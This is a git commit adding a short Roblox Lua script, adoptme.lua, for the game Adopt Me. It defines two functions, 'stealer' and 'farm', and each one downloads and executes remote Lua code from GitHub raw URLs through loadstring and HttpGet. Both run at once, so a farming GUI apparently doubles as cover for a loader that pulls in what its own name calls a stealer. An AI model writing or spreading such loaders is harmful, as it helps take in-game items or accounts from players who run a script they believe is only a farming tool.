000ba1aabbae43df192db521a600754dcd1ef8b9
trabulascript <tipo52808@gmail.com>
2025-04-03 09:09:00 +0200

    Create adoptme.lua

---
+++ adoptme.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/trabulascript/Adopt_me/refs/heads/main/script.lua",true))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/trabulascript/4doptme/refs/heads/main/gui.lua",true))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
